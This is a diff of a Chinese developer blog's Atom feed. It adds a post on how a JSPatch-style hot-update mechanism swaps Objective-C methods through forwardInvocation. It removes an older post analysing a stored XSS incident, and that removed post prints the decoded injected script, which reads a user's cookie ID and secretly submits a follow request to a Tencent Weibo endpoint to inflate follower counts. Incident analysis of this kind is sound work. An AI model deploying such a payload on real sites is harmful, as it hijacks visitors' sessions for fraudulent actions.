@@ -4,7 +4,7 @@
   <title><![CDATA[移动开发技术]]></title>
   <link href="http://jason5.cn/atom.xml" rel="self"/>
   <link href="http://jason5.cn/"/>
-  <updated>2018-11-05T16:20:34+08:00</updated>
+  <updated>2018-11-08T15:23:08+08:00</updated>
   <id>http://jason5.cn/</id>
   <author>
     <name><![CDATA[jason]]></name>
@@ -12,6 +12,47 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[对JSPatch原理的理解]]></title>
+    <link href="http://jason5.cn/blog/dui-jspatchyuan-li-de-li-jie.html"/>
+    <updated>2018-11-08T15:08:47+08:00</updated>
+    <id>http://jason5.cn/blog/dui-jspatchyuan-li-de-li-jie</id>
+    <content type="html"><![CDATA[<p>JSPatch利用OC语言的动态特性，让OC语言根据传入的JS代码，进行动态行为修改，以达到热更新的目的。</p>
+
+<p>项目中根据JSPatch的原理，自己实现了一套简单的热更新方案。以替换方法实现为例，热更新运行的步骤如下：</p>
+
+<p>1.补丁下发阶段</p>
+
+<p>应用启动的时候，会加载下发的补丁js文件，以下这一段热更新代码会被执行。</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">replaceMethod</span><span class="p">(</span><span class="s2">&quot;IGTabBarController&quot;</span><span class="p">,</span> <span class="s2">&quot;onNaviBarTaskBoxClick:&quot;</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">invocation</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">log</span><span class="p">(</span><span class="s2">&quot;origin method&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="nx">callOriginMethod</span><span class="p">(</span><span class="nx">invocation</span><span class="p">,</span> <span class="s2">&quot;origin_onNaviBarTaskBoxClick:&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">});</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>OC中的JSContext在初始化的时候加载过replaceMethod函数，所以会调用到OC代码</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">ocReplaceMethod</span><span class="o">:</span><span class="p">(</span><span class="nx">NSString</span> <span class="o">*</span><span class="p">)</span><span class="nx">className</span> <span class="nx">selectorName</span><span class="o">:</span><span class="p">(</span><span class="nx">NSString</span> <span class="o">*</span><span class="p">)</span><span class="nx">selectorName</span> <span class="nx">isClass</span><span class="o">:</span><span class="p">(</span><span class="nx">BOOL</span><span class="p">)</span><span class="nx">isClass</span> <span class="nx">func</span><span class="o">:</span><span class="p">(</span><span class="nx">JSValue</span> <span class="o">*</span><span class="p">)</span><span class="nx">func</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>这个函数里，做了一个重要的逻辑（这里参考了JSPatch的实现方式），将IGTabBarController的实例方法onNaviBarTaskBoxClick:指向了forwardInvocation:，然后自定义实现PMDForwardInvocation替换forwardInvocation:的行为</p>
+
+<p>2.用户调用阶段</p>
+
+<p>用户操作点击后，IGTabBarController的onNaviBarTaskBoxClick:会被执行，从而PMDForwardInvocation被执行，根据OC的函数转发特性，PMDForwardInvocation会拿到所有的函数参数信息invocation。然后调用<code>jsfunc(@[invocation])</code>。这样就将所有原生参数通过invocation对象传回给了js代码。js代码拿到这些参数就可以去实现任何逻辑了，以达到替换原方法的目的。</p>
+
+<p>总结：这里是一个很重要的技巧，如何将需要动态更新的OC方法的参数全部传给js代码，JSPatch是利用了forwardInvocation的特性。</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Express学习笔记(二)-路由]]></title>
@@ -1697,68 +1738,6 @@ Debugger用来调试js代码。在里边可以给代码设置断点，观察变�
 <p>优化后的动态效果图</p>
 
 <p><a href="http://jason5.cn/images/traceview_performance_after.gif"><img src="http://jason5.cn/images/traceview_performance_after.gif" alt="" /></a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[存储型XSS应用-微博刷粉]]></title>
-    <link href="http://jason5.cn/blog/xssying-yong-wei-bo-shua-fen.html"/>
-    <updated>2016-08-03T11:34:13+08:00</updated>
-    <id>http://jason5.cn/blog/xssying-yong-wei-bo-shua-fen</id>
-    <content type="html"><![CDATA[<p>目前腾讯监控系统发现space.aili.com存在大量恶意的请求，通过xxx.qq.com以期望达到刷微博粉丝的效果</p>
-
-<!--more-->
-
-
-<p>被插入代码截图如下（每个页面都有，框架被修改）</p>
-
-<p><img src="http://jason5.cn/images/xss-weibo1.png" alt="" /></p>
-
-<p>被插入的恶意代码为：</p>
-
-<p><img src="http://jason5.cn/images/xss-weibo3.png" alt="" /></p>
-
-<p>解码后为:</p>
-
-<p><img src="http://jason5.cn/images/xss-weibo4.png" alt="" /></p>
-
-<p>格式化</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-</span><span class='line'>    <span class="nb">window</span><span class="p">.</span><span class="nx">u</span> <span class="o">=</span> <span class="s2">&quot;chunxi_lu&quot;</span><span class="p">;</span>
-</span><span class='line'>    <span class="nb">window</span><span class="p">.</span><span class="nx">mm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;div&quot;</span><span class="p">);</span>
-</span><span class='line'>    <span class="nb">window</span><span class="p">.</span><span class="nx">mm</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&quot;&lt;iframe style=&#39;display:none&#39; name=&#39;mj&#39;&gt;&lt;/iframe&gt;&lt;form method=&#39;POST&#39; id=&#39;mi&#39; action=&#39;http://radio.t.qq.com/mini/follow.php&#39; target=&#39;mj&#39;&gt;&lt;input type=&#39;hidden&#39; value=&#39;&quot;</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">u</span> <span class="o">+</span> <span class="s2">&quot;&#39; name=&#39;u&#39;/&gt;&lt;input type=&#39;hidden&#39; value=&#39;&quot;</span> <span class="o">+</span> <span class="p">((</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/(?:^|\s)uin=o(\d+)/</span><span class="p">)</span> <span class="o">||</span> <span class="p">[</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">])[</span><span class="mi">1</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;&#39; name=&#39;uin&#39;/&gt;&lt;/form&gt;&quot;</span><span class="p">;</span>
-</span><span class='line'>    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">mm</span><span class="p">);</span>
-</span><span class='line'>    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;mi&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
-</span><span class='line'><span class="p">})()</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>innerHTML被修改为</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">style</span><span class="o">=</span><span class="s1">&#39;display:none&#39;</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;mj&#39;</span><span class="o">&gt;&lt;</span><span class="err">/iframe&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="s1">&#39;POST&#39;</span> <span class="nx">id</span><span class="o">=</span><span class="s1">&#39;mi&#39;</span> <span class="nx">action</span><span class="o">=</span><span class="s1">&#39;http://radio.t.qq.com/mini/follow.php&#39;</span> <span class="nx">target</span><span class="o">=</span><span class="s1">&#39;mj&#39;</span><span class="o">&gt;</span>
-</span><span class='line'>  <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s1">&#39;hidden&#39;</span> <span class="nx">value</span><span class="o">=</span><span class="s1">&#39;&quot; + window.u + &quot;&#39;</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;u&#39;</span> <span class="o">/&gt;</span>
-</span><span class='line'>  <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s1">&#39;hidden&#39;</span> <span class="nx">value</span><span class="o">=</span><span class="s1">&#39;&quot; + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || [&quot;&quot;, &quot;&quot;])[1] | 0) + &quot;&#39;</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;uin&#39;</span> <span class="o">/&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="err">/form&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>粉丝数刷到3w+</p>
-
-<p><img src="http://jason5.cn/images/xss-weibo2.png" alt="" /></p>
 ]]></content>
   </entry>
   
